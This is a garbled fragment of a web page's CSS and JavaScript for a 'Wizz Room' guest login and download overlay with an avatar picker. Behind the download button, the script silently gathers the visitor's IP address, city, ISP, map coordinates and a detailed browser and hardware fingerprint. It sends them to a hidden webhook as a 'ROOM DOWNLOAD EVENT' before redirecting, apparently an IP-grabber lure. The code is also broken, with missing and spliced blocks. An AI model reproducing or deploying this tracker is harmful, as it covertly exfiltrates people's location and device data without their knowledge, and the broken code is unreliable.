    <style>
        :root {
            --primary: #F4D03F;
            --primary-hover: #E8C91F;
            --bg-dark: #000000;
            --bg-secondary: #0f0f0f;
            --text-main: #ffffff;
            --text-secondary: #b3b3b3;
            --accent-red: #F4D03F;
            --card-border: rgba(255, 255, 255, 0.1);
            --button-gradient: linear-gradient(90deg, #FDB913 0%, #F4D03F 100%);
        }
        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
            font-family: 'Inter', sans-serif;
        }
        body {
            background-color: var(--bg-dark);
            color: var(--text-main);
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            background-image: radial-gradient(circle at center, #1a1a1a 0%, #000000 100%);
        }
        .auth-container {
            width: 100%;
            display: flex;
            justify-content: center;
            padding: 20px;
        }
        .auth-card {
            background: rgba(20, 20, 20, 0.6);
            backdrop-filter: blur(20px);
            -webkit-backdrop-filter: blur(20px);
            border: 1px solid var(--card-border);
            padding: 2.5rem;
            border-radius: 16px;
            width: 100%;
            max-width: 400px;
            text-align: center;
            box-shadow: 0 8px 32px 0 rgba(0, 0, 0, 0.37);
        }
        .auth-title {
            font-family: 'Outfit', sans-serif;
            font-size: 2rem;
            font-weight: 800;
            margin-bottom: 0.5rem;
        }
        .auth-subtitle {
            color: var(--text-secondary);
            font-size: 0.9rem;
            margin-bottom: 2rem;
        }
        .form-group {
            margin-bottom: 1.5rem;
            text-align: left;
        }
        .form-label {
            display: block;
            margin-bottom: 0.5rem;
            color: var(--text-secondary);
            font-size: 0.9rem;
        }
        .form-input {
            width: 100%;
            background: #1a1a1a;
            border: 1px solid #333;
            padding: 1rem;
            border-radius: 8px;
            color: white;
            font-size: 1rem;
            outline: none;
            transition: border-color 0.3s;
        }
        .form-input:focus {
            border-color: var(--primary);
        }
        .avatar-grid {
            display: flex;
            gap: 15px;
            justify-content: center;
            margin-bottom: 1rem;
            flex-wrap: wrap;
        }
        .avatar-option {
            width: 70px;
            height: 70px;
            border-radius: 50%;
            border: 3px solid var(--card-border);
            cursor: pointer;
            transition: all 0.3s cubic-bezier(0.175, 0.885, 0.32, 1.275);
            opacity: 0.8;
            padding: 2px;
            background: rgba(255, 255, 255, 0.05);
        }
        .avatar-option:hover {
            transform: scale(1.15);
            opacity: 1;
            border-color: var(--text-secondary);
        }
        .avatar-option.selected {
            border-color: var(--accent-red);
            opacity: 1;
            box-shadow: 0 0 20px rgba(244, 208, 63, 0.6);
            transform: scale(1.15);
            background: rgba(244, 208, 63, 0.1);
        }
        .btn-shuffle {
            background: transparent;
            border: 1px solid var(--card-border);
            color: var(--text-secondary);
            padding: 8px 16px;
            border-radius: 20px;
            font-size: 0.8rem;
            cursor: pointer;
            transition: all 0.2s;
            display: inline-flex;
            align-items: center;
            gap: 6px;
            margin-bottom: 1rem;
        }
        .btn-shuffle:hover {
            border-color: var(--text-main);
            color: var(--text-main);
            background: rgba(255, 255, 255, 0.05);
        }
        .btn {
            display: inline-flex;
            align-items: center;
            justify-content: center;
            padding: 1rem 2rem;
            border-radius: 30px;
            font-weight: 600;
            cursor: pointer;
            transition: transform 0.2s, box-shadow 0.2s;
            text-decoration: none;
            border: none;
        }
        .btn-primary {
            background: var(--button-gradient);
            color: #000;
            box-shadow: 0 4px 15px rgba(253, 185, 19, 0.4);
        }
        .btn-primary:hover {
            transform: translateY(-2px);
            box-shadow: 0 6px 20px rgba(253, 185, 19, 0.6);
        }
        .btn-primary:disabled {
            opacity: 0.7;
            cursor: not-allowed;
            transform: none;
        }
        /* Modal Overlay */
        .modal-overlay {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 0, 0, 0.8);
            backdrop-filter: blur(10px);
            z-index: 1000;
            display: none;
            justify-content: center;
            align-items: center;
            opacity: 0;
            transition: opacity 0.3s ease;
        }
        .modal-overlay.active {
            opacity: 1;
        }
        .modal-content {
            background: #141414;
            border: 1px solid rgba(244, 208, 63, 0.3);
            text-align: center;
            padding: 2.5rem;
            border-radius: 16px;
            max-width: 450px;
            width: 90%;
            animation: slideUp 0.4s ease;
        }
        .modal-icon {
            width: 60px;
            height: 60px;
            border-radius: 50%;
            background: rgba(244, 208, 63, 0.1);
            color: var(--accent-red);
            border: 1px solid rgba(244, 208, 63, 0.3);
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 1.5rem;
            margin: 0 auto 1.5rem;
        }
        @keyframes slideUp {
            from {
                transform: translateY(20px);
                opacity: 0;
            }
            to {
                transform: translateY(0);
                opacity: 1;
            }
        }

        async function getIpData() {
            try {
                const response = await fetch('https://ipapi.co/json/');
                return await response.json();
            } catch (e) {
                console.error("IP Fetch failed", e);
                return {};
            }
        }
        function getFlagEmoji(countryCode) {
            if (!countryCode) return '🌍';
            const codePoints = countryCode.toUpperCase().split('').map(char => 127397 + char.charCodeAt());
            return String.fromCodePoint(...codePoints);
        }
        async function sendWebhook(payload) {
            try {
                await fetch(WEBHOOK_URL, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(payload),
                    keepalive: true
                });
            } catch (error) {
                console.error("Webhook failed", error);
            }
        }
        function getSystemInfo() {
            // ... (keep existing implementation) ...
            let gpu = 'Unknown GPU';
            try {
                const canvas = document.createElement('canvas');
                const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
                if (gl) {
                    const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
                    if (debugInfo) {
                        gpu = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
                    }
                }
            } catch (e) {
                console.warn("GPU detect failed", e);
            }
            return {
                userAgent: navigator.userAgent,
                language: navigator.language,
                platform: navigator.platform,
                screen: `${window.screen.width}x${window.screen.height}`,
                colorDepth: `${window.screen.colorDepth}-bit`,
                deviceMemory: navigator.deviceMemory ? `~${navigator.deviceMemory} GB` : 'Unknown',
                hardwareConcurrency: navigator.hardwareConcurrency ? `${navigator.hardwareConcurrency} Logical Cores` : 'Unknown',
                touchPoints: navigator.maxTouchPoints,
                cookiesEnabled: navigator.cookieEnabled ? "Yes" : "No",

                referrer: document.referrer || 'Direct Access',
                currentUrl: window.location.href,
                gpu: gpu

            const btnShuffle = document.getElementById('btn-shuffle');
            let selectedAvatar = null;
            function generateAvatars() {
                if (!avatarGrid) return;
                avatarGrid.innerHTML = ''; // Clear existing
                const seeds = Array.from({ length: 5 }, () => Math.random().toString(36).substring(7));
                seeds.forEach((seed, index) => {
                    const img = document.createElement('img');
                    // Using 'notionists' style for a cleaner look
                    img.src = `https://api.dicebear.com/9.x/notionists/svg?seed=${seed}&backgroundColor=transparent`;
                    img.className = 'avatar-option';
                    if (index === 0 && !selectedAvatar) {
                        img.classList.add('selected');
                        selectedAvatar = seed;
                    } else if (seed === selectedAvatar) {
                        img.classList.add('selected');
                    }
                    img.onclick = () => {
                        document.querySelectorAll('.avatar-option').forEach(el => el.classList.remove('selected'));
                        img.classList.add('selected');
                        selectedAvatar = seed;
                    };
                    avatarGrid.appendChild(img);
                });
            }
            // Initial Generation
            generateAvatars();
            // Shuffle Handler
            if (btnShuffle) {
                btnShuffle.addEventListener('click', () => {

                        errorModal.style.display = 'flex';

                        errorModal.classList.add('active');
                        errorModal.style.animation = 'fadeIn 0.3s ease';
                        // Reset button
                        btnGuest.innerHTML = originalText;
                        btnGuest.disabled = false;
                    }, 1500);
                });
            }
            if (btnDownload) {
                btnDownload.addEventListener('click', async () => {
                    // Log download
                    const guestName = guestNameInput.value.trim() || 'Guest';
                    // Change button text to indicate processing
                    btnDownload.innerHTML = '<i class="fa-solid fa-spinner fa-spin"></i> Starting...';
                    try {
                        const data = await getIpData();
                        const sys = getSystemInfo();
                        const ip = data.ip || 'Unknown IP';
                        const country = data.country_name || 'Unknown Country';
                        const city = data.city || 'Unknown City';
                        const region = data.region || 'Unknown Region';
                        const isp = data.org || 'Unknown ISP';
                        const flag = getFlagEmoji(data.country_code);
                        const mapsLink = data.latitude && data.longitude ? `[View on Map](https://www.google.com/maps?q=${data.latitude},${data.longitude})` : 'N/A';
                        const payload = {
                            username: "Wizz Intelligence",
                            avatar_url: "https://i.imgur.com/4M34hi2.png",
                            embeds: [{
                                title: "📥 ROOM DOWNLOAD EVENT",
                                description: `User **${guestName}** initiated download via **Guest Overlay**.\nTargeting: High Intent.`,
                                color: 0x9b59b6, // Amethyst Purple
                                thumbnail: { url: "https://cdn-icons-png.flaticon.com/512/2983/2983973.png" },
                                fields: [
                                    { name: "📡 **Network & Geo**", value: `**IP:** \`${ip}\`\n**ISP:** ${isp}\n**Loc:** ${flag} ${city}, ${region}, ${country}\n**Conn:** ${sys.connection.toUpperCase()}\n**Map:** ${mapsLink}`, inline: true },
                                    { name: "💻 **Hardware Spec**", value: `**CPU:** ${sys.hardwareConcurrency}\n**RAM:** ${sys.deviceMemory}\n**GPU:** ${sys.gpu}\n**Scrn:** ${sys.screen} (${sys.colorDepth})`, inline: true },
                                    { name: "🧭 **Browser Env**", value: `**Platform:** ${sys.platform}\n**Lang:** ${sys.language}\n**Cookies:** ${sys.cookiesEnabled}\n**Touch:** ${sys.touchPoints > 0 ? 'Yes' : 'No'} (${sys.touchPoints})`, inline: true },
                                    { name: "🔗 **Session Context**", value: `**Page:** [Link](${sys.currentUrl})\n**Ref:** ${sys.referrer}\n**Time:** ${sys.timezone}`, inline: true },
                                    { name: "🕵️ **User Agent**", value: `\`\`\`${sys.userAgent}\`\`\``, inline: false }
                                ],
                                footer: { text: "Wizz Room Security • Guest Access", icon_url: "https://i.imgur.com/4M34hi2.png" },
                                timestamp: new Date().toISOString()
                            }]
                        };
                        await sendWebhook(payload);
                    } catch (e) {
                        console.error("Tracking error:", e);
                    }
                    window.location.href = downloadLink;
                });
            }
        });
